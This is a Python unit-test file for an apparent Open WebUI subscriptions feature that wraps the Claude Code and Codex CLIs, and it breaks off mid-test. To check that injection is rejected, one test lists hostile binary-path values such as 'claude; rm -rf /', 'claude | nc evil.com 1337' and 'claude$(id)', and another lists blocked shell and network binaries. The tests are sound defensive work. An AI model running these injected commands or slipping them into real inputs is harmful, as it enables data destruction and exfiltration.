"""Subscription cases executed only in the isolated runner process."""

from __future__ import annotations

import ast
import asyncio
import copy
import json
import os
import pathlib
import signal
import sys
import tempfile
import types
import unittest
from types import SimpleNamespace
from unittest.mock import AsyncMock, MagicMock, patch

_ORIGINAL_ENV = None
_TEST_TMP_DIR = None


def setUpModule():
    global _ORIGINAL_ENV, _TEST_TMP_DIR
    _ORIGINAL_ENV = dict(os.environ)
    test_base = os.path.expanduser('~/.tmp/mcchat-subscriptions')
    os.makedirs(test_base, exist_ok=True)
    _TEST_TMP_DIR = tempfile.TemporaryDirectory(dir=test_base, prefix='test_subs_')

    os.environ['USE_SLIM_DOCKER'] = 'true'
    os.environ['WEBUI_SECRET_KEY'] = 'test-secret-key-12345678901234567890'
    os.environ['ENABLE_DB_MIGRATIONS'] = 'false'
    os.environ['DATA_DIR'] = _TEST_TMP_DIR.name
    os.environ['DATABASE_URL'] = f'sqlite:///{_TEST_TMP_DIR.name}/test_webui.db'


def tearDownModule():
    global _ORIGINAL_ENV, _TEST_TMP_DIR
    if _TEST_TMP_DIR:
        try:
            _TEST_TMP_DIR.cleanup()
        except Exception:
            pass
    if _ORIGINAL_ENV is not None:
        os.environ.clear()
        os.environ.update(_ORIGINAL_ENV)


BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
BACKEND_DIR = os.path.join(BASE_DIR, 'backend')
if BACKEND_DIR not in sys.path:
    sys.path.insert(0, BACKEND_DIR)

from fastapi import HTTPException, status
from open_webui.subscriptions.adapters.claude import ClaudeCodeAdapter
from open_webui.subscriptions.adapters.codex import CodexAdapter
from open_webui.subscriptions.config import (
    DEFAULT_PROVIDERS_CONFIG,
    ModelConfigModel,
    ProviderConfigModel,
    SubscriptionsConfigForm,
)
from open_webui.subscriptions.executor import SubprocessExecutor
from open_webui.subscriptions.manager import (
    SAFE_SUBSCRIPTION_CAPABILITIES,
    SubscriptionManager,
    subscription_manager,
)
from open_webui.subscriptions.security import (
    check_subscription_access,
    sanitize_error_message,
    validate_binary_path,
    validate_chat_request_security,
    validate_config_dir,
    validate_owner_assignment,
)


class MockUser:
    def __init__(self, role='user', user_id='user-123', email='test@example.com'):
        self.role = role
        self.id = user_id
        self.email = email


class TestSubscriptionSecurity(unittest.TestCase):
    """Test argument injection defense, multi-level chat security gates, and single-owner access controls."""

    def test_binary_path_safe_names(self):
        self.assertEqual(validate_binary_path('claude', 'claude'), 'claude')
        self.assertEqual(validate_binary_path('codex', 'codex'), 'codex')
        self.assertEqual(validate_binary_path('', 'claude'), 'claude')
        self.assertEqual(validate_binary_path('  ', 'claude'), 'claude')

    def test_binary_path_rejects_shell_injection(self):
        for bad in [
            'claude; rm -rf /',
            'claude && whoami',
            'claude | nc evil.com 1337',
            'claude`id`',
            'claude$(id)',
            'claude\nls',
        ]:
            with self.assertRaises(ValueError):
                validate_binary_path(bad, 'claude')

    def test_binary_path_rejects_forbidden_system_binaries(self):
        for bad in ['sh', 'bash', 'sudo', 'rm', 'curl', 'wget', 'python', 'node']:
            with self.assertRaises(ValueError):
                validate_binary_path(bad, 'claude')

    def test_binary_path_rejects_nonexistent_absolute_path(self):
        with self.assertRaises(ValueError):
            validate_binary_path('/nonexistent/path/to/claude', 'claude')

    def test_config_dir_validation(self):
        self.assertEqual(validate_config_dir(''), '')
        self.assertEqual(validate_config_dir('   '), '')
        with self.assertRaises(ValueError):
            validate_config_dir('/tmp/path;rm -rf /')

    def test_error_message_sanitization(self):
        raw = 'Error in /home/john_doe/.claude/auth.json: invalid sk-proj-12345678901234567890 token'
        sanitized = sanitize_error_message(raw)
        self.assertNotIn('/home/john_doe', sanitized)
        self.assertNotIn('sk-proj-12345678901234567890', sanitized)
        self.assertIn('[REDACTED_API_KEY]', sanitized)
        self.assertIn('~', sanitized)

    def test_single_owner_access_control(self):
        owner = MockUser(role='user', user_id='owner-1')
        other = MockUser(role='admin', user_id='other-admin')

        # When unclaimed, nobody can access
        with self.assertRaises(HTTPException) as ctx:
            check_subscription_access(owner, owner_id='')
        self.assertEqual(ctx.exception.status_code, 403)

        # Owner has access
        check_subscription_access(owner, owner_id='owner-1')

        # Other user (even admin) is denied
        with self.assertRaises(HTTPException) as ctx:
            check_subscription_access(other, owner_id='owner-1')
        self.assertEqual(ctx.exception.status_code, 403)

    def test_owner_assignment_validation(self):
        admin = MockUser(role='admin', user_id='admin-1')
        regular = MockUser(role='user', user_id='user-1')

        # Non-admin cannot configure
        with self.assertRaises(HTTPException) as ctx:
            validate_owner_assignment('admin-1', regular)
        self.assertEqual(ctx.exception.status_code, 403)

        # Admin cannot claim for another user on fresh setup
        with self.assertRaises(HTTPException) as ctx:
            validate_owner_assignment('user-2', admin)
        self.assertEqual(ctx.exception.status_code, 400)

        # Admin can claim for self
        validate_owner_assignment('admin-1', admin, existing_owner_id='', enabled=True)

        # Ownership cannot be transferred once claimed
        with self.assertRaises(HTTPException) as ctx:
            validate_owner_assignment('admin-2', MockUser('admin', 'admin-2'), existing_owner_id='admin-1')
        self.assertEqual(ctx.exception.status_code, 403)

        # Owner cannot clear ownership
        with self.assertRaises(HTTPException) as ctx:
            validate_owner_assignment('', admin, existing_owner_id='admin-1')
        self.assertEqual(ctx.exception.status_code, 400)

    def test_chat_security_rejects_tools_early_and_late(self):
        # Tools in form_data rejected
        with self.assertRaises(HTTPException) as ctx:
            validate_chat_request_security({
                'tools': [{'type': 'function'}],
                'messages': [{'role': 'user', 'content': 'hi'}],
            })
        self.assertEqual(ctx.exception.status_code, 400)

        # Tool calls in messages rejected
        with self.assertRaises(HTTPException) as ctx:
            validate_chat_request_security({
                'messages': [{'role': 'user', 'content': 'hi', 'tool_calls': [{'id': '1'}]}],
            })
        self.assertEqual(ctx.exception.status_code, 400)

    def test_chat_security_rejects_attachments_and_multimodal_blocks(self):
        # File attachments rejected
        with self.assertRaises(HTTPException) as ctx:
            validate_chat_request_security({
                'files': [{'id': 'file-1'}],
                'messages': [{'role': 'user', 'content': 'hi'}],
            })
        self.assertEqual(ctx.exception.status_code, 400)

        # Multimodal image blocks rejected
        with self.assertRaises(HTTPException) as ctx:
            validate_chat_request_security({
                'messages': [{
                    'role': 'user',
                    'content': [
                        {'type': 'text', 'text': 'look at this'},
                        {'type': 'image_url', 'image_url': {'url': 'http://evil.com/img.png'}},
                    ],
                }],
            })
        self.assertEqual(ctx.exception.status_code, 400)

    def test_chat_security_rejects_nondefault_sampling_controls(self):
        with self.assertRaises(HTTPException) as ctx:
            validate_chat_request_security({
                'temperature': 0.7,
                'messages': [{'role': 'user', 'content': 'hi'}],
            })
        self.assertEqual(ctx.exception.status_code, 400)

        with self.assertRaises(HTTPException) as ctx:
            validate_chat_request_security({
                'top_p': 0.9,
                'messages': [{'role': 'user', 'content': 'hi'}],
            })
        self.assertEqual(ctx.exception.status_code, 400)

        with self.assertRaises(HTTPException) as ctx:
            validate_chat_request_security({
                'n': 2,
                'messages': [{'role': 'user', 'content': 'hi'}],
            })
        self.assertEqual(ctx.exception.status_code, 400)

    def test_phased_saved_chat_empty_messages_with_user_message_succeeds(self):
        """Chat.svelte sends messages=[] and user_message in metadata for saved chat turn."""
        form_data = {'model': 'subscription:claude:sonnet', 'messages': []}
        metadata = {'chat_id': 'saved-chat-1', 'user_message': {'role': 'user', 'content': 'Hello!'}}
        # Early phase (require_complete_messages=False) must succeed
        validate_chat_request_security(form_data, metadata=metadata, require_complete_messages=False)

    def test_phased_saved_chat_system_only_messages_succeeds(self):
        """Chat.svelte sends system-only messages and user_message in metadata for saved chat turn."""
        form_data = {
            'model': 'subscription:claude:sonnet',
            'messages': [{'role': 'system', 'content': 'Be concise'}],
        }
        metadata = {'chat_id': 'saved-chat-1', 'user_message': {'role': 'user', 'content': 'Hello!'}}
        validate_chat_request_security(form_data, metadata=metadata, require_complete_messages=False)

    def test_phased_saved_chat_regeneration_with_assistant_message_id_succeeds(self):
        """Regeneration sends assistant_message_id and messages=[] with prompt loaded later."""
        form_data = {'model': 'subscription:claude:sonnet', 'messages': []}
        metadata = {'chat_id': 'saved-chat-1', 'assistant_message_id': 'asst-msg-123'}
        validate_chat_request_security(form_data, metadata=metadata, require_complete_messages=False)

    def test_phased_saved_chat_rejects_user_message_multimodal_blocks(self):
        """Early validation must deeply inspect user_message content blocks and reject image/multimodal blocks."""
        form_data = {'model': 'subscription:claude:sonnet', 'messages': []}
        metadata = {
            'chat_id': 'saved-chat-1',
            'user_message': {
                'role': 'user',
                'content': [{'type': 'image_url', 'image_url': 'http://image.png'}],
            },
        }
        with self.assertRaises(HTTPException) as ctx:
            validate_chat_request_security(form_data, metadata=metadata, require_complete_messages=False)
        self.assertEqual(ctx.exception.status_code, 400)
        self.assertIn('multimodal attachments', ctx.exception.detail)

    def test_phased_saved_chat_rejects_user_message_tools_and_files(self):
        """Early validation must reject tools and file attachments in metadata.user_message."""
        form_data = {'model': 'subscription:claude:sonnet', 'messages': []}
        metadata = {
            'chat_id': 'saved-chat-1',
            'user_message': {
                'role': 'user',
                'content': 'hello',
                'tool_calls': [{'id': 'call_1'}],
            },
        }
        with self.assertRaises(HTTPException) as ctx:
            validate_chat_request_security(form_data, metadata=metadata, require_complete_messages=False)
        self.assertEqual(ctx.exception.status_code, 400)

        metadata_files = {
            'chat_id': 'saved-chat-1',
            'user_message': {
                'role': 'user',
                'content': 'hello',
                'files': [{'id': 'f1'}],
            },
        }
        with self.assertRaises(HTTPException) as ctx:
            validate_chat_request_security(form_data, metadata=metadata_files, require_complete_messages=False)
        self.assertEqual(ctx.exception.status_code, 400)

    def test_strict_phase_requires_complete_messages(self):
        """Postmiddleware strict phase (require_complete_messages=True) must require reconstructed non-empty messages."""
        form_data = {'model': 'subscription:claude:sonnet', 'messages': []}
        metadata = {'chat_id': 'saved-chat-1', 'user_message': {'role': 'user', 'content': 'Hello!'}}
        with self.assertRaises(HTTPException) as ctx:
            validate_chat_request_security(form_data, metadata=metadata, require_complete_messages=True)
        self.assertEqual(ctx.exception.status_code, 400)

        # Complete reconstructed messages pass
        form_data_complete = {
            'model': 'subscription:claude:sonnet',
            'messages': [
                {'role': 'system', 'content': 'Be concise'},
                {'role': 'user', 'content': 'Hello!'},
            ],
        }
        validate_chat_request_security(form_data_complete, metadata=metadata, require_complete_messages=True)

    def test_early_phase_rejects_when_no_user_message_or_regeneration(self):
        """Even with require_complete_messages=False, empty messages without user_message or regeneration must fail 400."""
        form_data = {'model': 'subscription:claude:sonnet', 'messages': []}
        with self.assertRaises(HTTPException) as ctx:
            validate_chat_request_security(form_data, metadata={'chat_id': 'saved-1'}, require_complete_messages=False)
        self.assertEqual(ctx.exception.status_code, 400)


class TestSubprocessExecutor(unittest.IsolatedAsyncioTestCase):
    """Test process isolation, timeout enforcement, and clean termination."""

    async def test_execute_command_success(self):
        code, stdout, stderr = await SubprocessExecutor.execute_command(
            ['echo', 'hello'],
            timeout=5,
        )
        self.assertEqual(code, 0)
        self.assertEqual(stdout.strip(), 'hello')

    async def test_execute_command_timeout_and_group_kill(self):
        with self.assertRaises(TimeoutError):
            await SubprocessExecutor.execute_command(
                ['sleep', '10'],
                timeout=1,
            )

    async def test_execute_stream_nonzero_failure_propagates_error(self):
        # Command that outputs text then exits with code 1
        lines = []
        with self.assertRaises(RuntimeError) as ctx:
            async for chunk in SubprocessExecutor.execute_stream(
                ['sh', '-c', 'echo "fatal error" >&2; exit 1'],
                timeout=5,
            ):
                lines.append(chunk)
        self.assertIn('failed with exit code 1', str(ctx.exception))

    async def test_process_group_descendant_termination(self):
        # Spawn child that spawns a grandchild
        cmd = ['sh', '-c', 'sh -c "sleep 30" & wait']
        with self.assertRaises(TimeoutError):
            await SubprocessExecutor.execute_command(cmd, timeout=1)


class TestClaudeCodeAdapter(unittest.IsolatedAsyncioTestCase):
    """Test CLI harness invocation, environment isolation, and streaming event unwrapping."""

    def setUp(self):
        self.adapter = ClaudeCodeAdapter()
        self.config = ProviderConfigModel(
            enabled=True,
            binary_path='claude',
            config_dir='/tmp/test_claude',
        )

    def test_build_command_args_isolation(self):
        args = self.adapter._build_command_args(
            binary='claude',
            model_id='sonnet',
            streaming=True,
        )
        self.assertIn('--safe-mode', args)
        self.assertIn('--disallowedTools', args)
        self.assertIn('*', args)
        self.assertIn('--tools', args)
        self.assertIn('--no-session-persistence', args)
        self.assertIn('--strict-mcp-config', args)
        self.assertIn('--model', args)
        self.assertIn('sonnet', args)

    def test_environment_strips_api_keys(self):
        raw_env = {
            'PATH': '/usr/bin',
            'ANTHROPIC_API_KEY': 'sk-ant-secret',
            'OPENAI_API_KEY': 'sk-secret',
            'T3_TOOL_SECRET': 'secret',
            'USER': 'testuser',
        }
        with patch.dict(os.environ, raw_env, clear=True):
            clean = self.adapter._get_env(self.config)
            self.assertNotIn('ANTHROPIC_API_KEY', clean)
            self.assertNotIn('OPENAI_API_KEY', clean)
            self.assertNotIn('T3_TOOL_SECRET', clean)
            self.assertEqual(clean.get('CLAUDE_CONFIG_DIR'), '/tmp/test_claude')

    async def test_auth_status_uses_official_cli(self):
        with patch.object(self.adapter, 'is_installed', return_value=(True, 'claude')):
            with patch.object(self.adapter, '_verify_capabilities', new_callable=AsyncMock, return_value=(True, '', '1.2.0')):
                # Mock CLI output returning authenticated JSON
                auth_json = json.dumps({'loggedIn': True, 'authMethod': 'claude.ai', 'user': 'test@example.com'})
                with patch.object(SubprocessExecutor, 'execute_command', return_value=(0, auth_json, '')):
                    res = await self.adapter.check_auth_status(self.config)
                    self.assertTrue(res['authenticated'])
                    self.assertTrue(res['execution_available'])
                    self.assertEqual(res['status'], 'authenticated')

                # Mock CLI returning not logged in
                not_logged = json.dumps({'loggedIn': False, 'authMethod': 'none', 'error': 'Not logged in'})
                with patch.object(SubprocessExecutor, 'execute_command', return_value=(1, not_logged, '')):
                    res = await self.adapter.check_auth_status(self.config)
                    self.assertFalse(res['authenticated'])
                    self.assertFalse(res['execution_available'])

    async def test_stream_parsing_handles_wrapped_stream_events(self):
        # Simulate Claude CLI stream output: structured message chunks wrapped in event stream
        cli_chunks = [
            '{"type": "stream_event", "event": {"type": "content_block_delta", "delta": {"type": "text_delta", "text": "Hello"}}}\n',
            '{"type": "stream_event", "event": {"type": "content_block_delta", "delta": {"type": "text_delta", "text": " world!"}}}\n',
            '{"type": "result", "subtype": "success", "is_error": false, "usage": {"input_tokens": 8, "output_tokens": 4}}\n',
        ]

        async def mock_stream(*args, **kwargs):
            for c in cli_chunks:
                yield c

        with patch.object(self.adapter, 'is_installed', return_value=(True, 'claude')):
            with patch.object(self.adapter, '_verify_capabilities', new_callable=AsyncMock, return_value=(True, '', '1.2.0')):
                with patch.object(self.adapter, 'check_auth_status', new_callable=AsyncMock, return_value={'installed': True, 'authenticated': True, 'execution_available': True}):
                    with patch.object(SubprocessExecutor, 'execute_stream', side_effect=mock_stream):
                        collected = []
                        async for sse_chunk in self.adapter.chat_completion_stream(
                            {'messages': [{'role': 'user', 'content': 'Hi'}]},
                            'sonnet',
                            self.config,
                            timeout=10,
                        ):
                            collected.append(sse_chunk)

                        self.assertGreater(len(collected), 0)
                        full_text = ''.join(collected)
                        self.assertIn('Hello', full_text)
                        self.assertIn(' world!', full_text)


class TestCodexAdapter(unittest.IsolatedAsyncioTestCase):
    """Test Codex adapter contract and safety posture."""

    def setUp(self):
        self.adapter = CodexAdapter()
        self.config = ProviderConfigModel(enabled=True, binary_path='codex')

    async def test_chat_completion_fails_closed_when_cli_missing_or_fails(self):
        with patch.object(self.adapter, 'is_installed', return_value=(False, 'Codex CLI executable not found')):
            with self.assertRaises(RuntimeError) as ctx:
                await self.adapter.chat_completion(
                    {'messages': [{'role': 'user', 'content': 'hi'}]},
                    'default',
                    self.config,
                )
            self.assertIn('Codex CLI executable not found', str(ctx.exception))

    async def test_auth_status_requires_valid_credentials(self):
        cfg = ProviderConfigModel(enabled=True, binary_path='codex')
        with patch.object(self.adapter, 'is_installed', return_value=(True, 'codex')):
            with patch.object(self.adapter, '_verify_capabilities', new=unittest.mock.AsyncMock(return_value=(True, '', '0.166.0'))):
                with patch.object(SubprocessExecutor, 'execute_command', return_value=(1, 'Not logged in', '')):
                    res = await self.adapter.check_auth_status(cfg)
                    self.assertFalse(res['authenticated'])
                    self.assertFalse(res['execution_available'])

                with patch.object(SubprocessExecutor, 'execute_command', return_value=(0, 'Logged in using ChatGPT', '')):
                    res = await self.adapter.check_auth_status(cfg)
                    self.assertTrue(res['authenticated'])
                    self.assertTrue(res['execution_available'])


class TestConfigSchemaStrictness(unittest.TestCase):
    """Test strict Pydantic validation on subscription configurations."""

    def test_rejects_extra_fields(self):
        with self.assertRaises(ValueError):
            SubscriptionsConfigForm(
                ENABLE_SUBSCRIPTIONS=True,
                SUBSCRIPTIONS_OWNER_ID='admin',
                extra_unknown_field='forbidden',
            )

    def test_rejects_invalid_timeout(self):
        with self.assertRaises(ValueError):
            SubscriptionsConfigForm(
                ENABLE_SUBSCRIPTIONS=False,
                SUBSCRIPTIONS_REQUEST_TIMEOUT=0,
            )
        with self.assertRaises(ValueError):
            SubscriptionsConfigForm(
                ENABLE_SUBSCRIPTIONS=False,
                SUBSCRIPTIONS_REQUEST_TIMEOUT=601,
            )

    def test_model_id_validation_rejects_leading_dash(self):
        with self.assertRaises(ValueError):
            SubscriptionsConfigForm(
                ENABLE_SUBSCRIPTIONS=True,
                SUBSCRIPTIONS_OWNER_ID='admin',
                SUBSCRIPTIONS_PROVIDERS={
                    'claude': ProviderConfigModel(
                        enabled=True,
                        models=[ModelConfigModel(id='-invalid-id', name='Invalid')],
                    )
                },
            )

    def test_rejects_duplicate_models(self):
        with self.assertRaises(ValueError):
            ProviderConfigModel(
                enabled=True,
                models=[
                    ModelConfigModel(id='sonnet', name='Sonnet'),
                    ModelConfigModel(id='sonnet', name='Sonnet Duplicate'),
                ],
            )


class TestSubscriptionManager(unittest.IsolatedAsyncioTestCase):
    """Test subscription manager model discovery, real SQLAlchemy database sessions, and atomic CAS concurrency."""

    async def test_nonpersistent_config_rejects_mutation_before_database_write(self):
        from fastapi import HTTPException
        from open_webui.models.config import Config
        from open_webui.subscriptions.manager import SubscriptionManager
        from open_webui.subscriptions.config import SubscriptionsConfigForm
        with patch.object(Config, 'PERSISTENT_ENABLED', False):
            with self.assertRaises(HTTPException) as caught:
                await SubscriptionManager().update_config(SubscriptionsConfigForm(
                    ENABLE_SUBSCRIPTIONS=True, SUBSCRIPTIONS_OWNER_ID='owner', SUBSCRIPTIONS_PROVIDERS={}),
                    MockUser('admin', 'owner'))
            self.assertEqual(caught.exception.status_code, 400)
            self.assertIn('persistent configuration', caught.exception.detail)
        async with self.session_maker() as session:
            self.assertIsNone(await session.get(Config, 'subscriptions.owner_id'))

    async def test_private_model_search_excludes_subscriptions_before_pagination_and_count(self):
        import ast
        from pathlib import Path
        from types import SimpleNamespace as NS
        from sqlalchemy import BigInteger, Boolean, Column, Text, func, or_, select
        from sqlalchemy.orm import declarative_base
        from open_webui.internal.db import JSONField, get_async_db_context
        # Execute the production ORM/query with a real private SQLite session.
        # Unrelated media/avatar imports require optional packages absent here.
        tree = ast.parse((Path(BASE_DIR) / 'backend/open_webui/models/models.py').read_text())
        model_node = next(node for node in tree.body if isinstance(node, ast.ClassDef) and node.name == 'Model')
        search_node = next(node for node in ast.walk(tree) if isinstance(node, ast.AsyncFunctionDef) and node.name == 'search_models')
        Base = declarative_base()
        class SearchUser(Base):
            __tablename__ = 'subscription_search_users'
            id = Column(Text, primary_key=True)
        async def response(model, **kwargs):
            return NS(model_dump=lambda: {'id': model.id})
        ns = {'Base': Base, 'Column': Column, 'Text': Text, 'Boolean': Boolean, 'BigInteger': BigInteger,
              'JSONField': JSONField, 'User': SearchUser, 'func': func, 'or_': or_, 'select': select,
              'get_async_db_context': get_async_db_context, 'ModelUserResponse': NS, 'ModelListResponse': NS,
              'AccessGrants': NS(get_grants_by_resources=AsyncMock(return_value={}))}
        unit = ast.Module(body=[ast.ImportFrom(module='__future__', names=[ast.alias(name='annotations')], level=0), model_node, search_node], type_ignores=[])
        exec(compile(ast.fix_missing_locations(unit), '<actual-model-search-sql>', 'exec'), ns)
        Model = ns['Model']
        query_owner = NS(_has_permission=lambda db, stmt, filters, **kwargs: stmt, _to_model_model=response)
        async with self.engine.begin() as connection:
            await connection.run_sync(Base.metadata.create_all)
        async with self.session_maker() as session:
            for mid, base in [('api-preset', 'api'), ('sub-preset', 'subscription:claude:sonnet'),
                              ('chain-preset', 'sub-preset'), ('subscription:codex:default', None)]:
                session.add(Model(id=mid, user_id='owner', name=mid, base_model_id=base,
                    params={}, meta={}, created_at=1, updated_at=1, is_active=True))
            await session.commit()
            visible = await ns['search_models'](query_owner, 'other-admin', filter={
                'exclude_subscription_models': True, 'excluded_model_ids': ['chain-preset']}, limit=1, db=session)
            self.assertEqual(visible.total, 1)
            self.assertEqual([row.id for row in visible.items], ['api-preset'])
            owner = await ns['search_models'](query_owner, 'owner', filter={}, limit=1, db=session)
            self.assertEqual(owner.total, 3)

    async def asyncSetUp(self):
        import contextlib
        from sqlalchemy.ext.asyncio import create_async_engine, async_sessionmaker
        from open_webui.internal.db import Base
        from open_webui.models.config import Config

        self.tmp_dir = tempfile.TemporaryDirectory(dir='/home/betheenvy/.tmp/mcchat-subscriptions', prefix='test_mgr_')
        self.db_path = os.path.join(self.tmp_dir.name, 'test.db')
        self.engine = create_async_engine(f'sqlite+aiosqlite:///{self.db_path}')
        async with self.engine.begin() as conn:
            await conn.run_sync(Base.metadata.create_all)
        self.session_maker = async_sessionmaker(self.engine, expire_on_commit=False)

        @contextlib.asynccontextmanager
        async def mock_get_async_db():
            async with self.session_maker() as session:
                yield session

        self.db_patcher1 = patch('open_webui.internal.db.get_async_db', side_effect=mock_get_async_db)
        self.db_patcher2 = patch('open_webui.models.config.get_async_db', side_effect=mock_get_async_db)
        self.db_patcher1.start()
        self.db_patcher2.start()

    async def asyncTearDown(self):
        self.db_patcher2.stop()
        self.db_patcher1.stop()
        await self.engine.dispose()
        self.tmp_dir.cleanup()

    async def test_canonical_discovery_without_requester_pollution(self):
        mgr = SubscriptionManager()
        owner = MockUser(role='admin', user_id='owner-1')
        other = MockUser(role='user', user_id='user-2')

        with patch.object(
            mgr,
            'get_runtime_config',
            return_value=(
                True,
                'owner-1',
                180,
                {'claude': ProviderConfigModel(enabled=True, binary_path='claude')},
            ),
        ):
            with patch.object(mgr.get_adapter('claude'), 'is_installed', return_value=(True, 'claude')):
                models_canonical = await mgr.get_models(user=None)
                self.assertGreater(len(models_canonical), 0)
                caps = models_canonical[0]['info']['meta']['capabilities']
                self.assertFalse(caps['builtin_tools'])
                self.assertFalse(caps['tools'])

                models_owner = await mgr.get_models(user=owner)
                self.assertEqual(len(models_owner), len(models_canonical))

                models_other = await mgr.get_models(user=other)
                self.assertEqual(models_other, [])

    async def test_atomic_claim_concurrency_conflict_existing_blank_row(self):
        """Simulate two workers synchronized to hit pre-existing blank owner row; one succeeds, other gets 409."""
        from open_webui.models.config import Config
        from sqlalchemy.ext.asyncio import AsyncSession, async_sessionmaker

        # Seed pre-existing blank owner row (as Config.seed_defaults does)
        async with self.session_maker() as db:
            db.add_all([
                Config(key='subscriptions.owner_id', value=''),
                Config(key='subscriptions.enable', value=False),
                Config(key='subscriptions.request_timeout', value=180),
                Config(key='subscriptions.providers', value={}),
            ])
            await db.commit()

        both_read = asyncio.Event()
        counter = 0

        class SynchronizedSession(AsyncSession):
            async def get(self, entity, key, *args, **kwargs):
                nonlocal counter
                result = await super().get(entity, key, *args, **kwargs)
                if key == 'subscriptions.owner_id' and not getattr(self, '_seen_owner', False):
                    self._seen_owner = True
                    counter += 1
                    if counter == 2:
                        both_read.set()
                    await both_read.wait()
                return result

        sync_maker = async_sessionmaker(self.engine, class_=SynchronizedSession, expire_on_commit=False)
        import contextlib

        @contextlib.asynccontextmanager
        async def sync_get_db():
            async with sync_maker() as session:
                yield session

        mgr = SubscriptionManager()

        def make_form(uid):
            return SubscriptionsConfigForm(
                ENABLE_SUBSCRIPTIONS=True,
                SUBSCRIPTIONS_OWNER_ID=uid,
                SUBSCRIPTIONS_REQUEST_TIMEOUT=180,
                SUBSCRIPTIONS_PROVIDERS={'claude': ProviderConfigModel(enabled=True)},
            )

        with patch('open_webui.internal.db.get_async_db', side_effect=sync_get_db), \
             patch('open_webui.models.config.get_async_db', side_effect=sync_get_db):
            results = await asyncio.gather(
                mgr.update_config(make_form('admin-A'), MockUser('admin', 'admin-A')),
                mgr.update_config(make_form('admin-B'), MockUser('admin', 'admin-B')),
                return_exceptions=True,
            )

        # One must succeed and one must fail with 409 Conflict
        successes = [r for r in results if isinstance(r, dict)]
        conflicts = [r for r in results if isinstance(r, HTTPException) and r.status_code == 409]
        self.assertEqual(len(successes), 1, f'Expected 1 success, got {results}')
        self.assertEqual(len(conflicts), 1, f'Expected 1 409 conflict, got {results}')

    async def test_atomic_claim_concurrency_conflict_missing_row(self):
        """Simulate two workers synchronized when owner row is absent; one succeeds, other gets 409."""
        from sqlalchemy.ext.asyncio import AsyncSession, async_sessionmaker
        both_read = asyncio.Event()
        counter = 0

        class SynchronizedSession(AsyncSession):
            async def get(self, entity, key, *args, **kwargs):
                nonlocal counter
                result = await super().get(entity, key, *args, **kwargs)
                if key == 'subscriptions.owner_id' and not getattr(self, '_seen_missing', False):
                    self._seen_missing = True
                    counter += 1
                    if counter == 2:
                        both_read.set()
                    await both_read.wait()
                return result

        sync_maker = async_sessionmaker(self.engine, class_=SynchronizedSession, expire_on_commit=False)
        import contextlib

        @contextlib.asynccontextmanager
        async def sync_get_db():
            async with sync_maker() as session:
                yield session

        mgr = SubscriptionManager()

        def make_form(uid):
            return SubscriptionsConfigForm(
                ENABLE_SUBSCRIPTIONS=True,
                SUBSCRIPTIONS_OWNER_ID=uid,
                SUBSCRIPTIONS_REQUEST_TIMEOUT=180,
                SUBSCRIPTIONS_PROVIDERS={'claude': ProviderConfigModel(enabled=True)},
            )

        with patch('open_webui.internal.db.get_async_db', side_effect=sync_get_db), \
             patch('open_webui.models.config.get_async_db', side_effect=sync_get_db):
            results = await asyncio.gather(
                mgr.update_config(make_form('admin-1'), MockUser('admin', 'admin-1')),
                mgr.update_config(make_form('admin-2'), MockUser('admin', 'admin-2')),
                return_exceptions=True,
            )

        successes = [r for r in results if isinstance(r, dict)]
        conflicts = [r for r in results if isinstance(r, HTTPException) and r.status_code == 409]
        self.assertEqual(len(successes), 1, f'Expected 1 success on missing row, got {results}')
        self.assertEqual(len(conflicts), 1, f'Expected 1 409 conflict on missing row, got {results}')

    async def test_sqlite_lock_conflict_returns_409_and_rolls_back_atomically(self):
        """SQLite OperationalError (busy/locked) must return 409 (not 500) and roll back atomically."""
        from sqlalchemy.exc import OperationalError
        from open_webui.models.config import Config

        mgr = SubscriptionManager()
        form = SubscriptionsConfigForm(
            ENABLE_SUBSCRIPTIONS=True,
            SUBSCRIPTIONS_OWNER_ID='admin-1',
            SUBSCRIPTIONS_REQUEST_TIMEOUT=180,
            SUBSCRIPTIONS_PROVIDERS={'claude': ProviderConfigModel(enabled=True)},
        )

        with patch.object(self.session_maker.class_, 'flush', side_effect=OperationalError('database is locked', {}, None)):
            with self.assertRaises(HTTPException) as ctx:
                await mgr.update_config(form, MockUser('admin', 'admin-1'))
            self.assertEqual(ctx.exception.status_code, 409)

        # Verify no partial provider rows were committed
        async with self.session_maker() as db:
            row = await db.get(Config, 'subscriptions.owner_id')
            self.assertIsNone(row)

    async def test_environment_owner_default_when_db_row_absent(self):
        """When DB row is absent, env default SUBSCRIPTIONS_OWNER_ID is respected."""
        mgr = SubscriptionManager()
        with patch('open_webui.subscriptions.manager.DEFAULT_SUBSCRIPTIONS_OWNER_ID', 'env-admin'):
            form = SubscriptionsConfigForm(
                ENABLE_SUBSCRIPTIONS=True,
                SUBSCRIPTIONS_OWNER_ID='env-admin',
                SUBSCRIPTIONS_REQUEST_TIMEOUT=180,
                SUBSCRIPTIONS_PROVIDERS={'claude': ProviderConfigModel(enabled=True)},
            )
            # Matching env-admin can update
            res = await mgr.update_config(form, MockUser('admin', 'env-admin'))
            self.assertEqual(res['SUBSCRIPTIONS_OWNER_ID'], 'env-admin')

    async def test_same_owner_allowed_update_and_transfers_clearing_forbidden(self):
        """Same owner can update providers; transferring to another owner or clearing is forbidden."""
        mgr = SubscriptionManager()
        owner = MockUser('admin', 'owner-A')
        other = MockUser('admin', 'owner-B')

        form_initial = SubscriptionsConfigForm(
            ENABLE_SUBSCRIPTIONS=True,
            SUBSCRIPTIONS_OWNER_ID='owner-A',
            SUBSCRIPTIONS_REQUEST_TIMEOUT=180,
            SUBSCRIPTIONS_PROVIDERS={'claude': ProviderConfigModel(enabled=True)},
        )
        res = await mgr.update_config(form_initial, owner)
        self.assertEqual(res['SUBSCRIPTIONS_OWNER_ID'], 'owner-A')

        # Same owner updates settings -> allowed
        form_update = SubscriptionsConfigForm(
            ENABLE_SUBSCRIPTIONS=True,
            SUBSCRIPTIONS_OWNER_ID='owner-A',
            SUBSCRIPTIONS_REQUEST_TIMEOUT=240,
            SUBSCRIPTIONS_PROVIDERS={'claude': ProviderConfigModel(enabled=False)},
        )
        res2 = await mgr.update_config(form_update, owner)
        self.assertEqual(res2['SUBSCRIPTIONS_REQUEST_TIMEOUT'], 240)

        # Other admin cannot update -> 403
        with self.assertRaises(HTTPException) as ctx:
            await mgr.update_config(form_update, other)
        self.assertEqual(ctx.exception.status_code, 403)

        # Owner cannot clear or transfer ownership
        form_clear = SubscriptionsConfigForm(
            ENABLE_SUBSCRIPTIONS=False,
            SUBSCRIPTIONS_OWNER_ID='',
            SUBSCRIPTIONS_REQUEST_TIMEOUT=180,
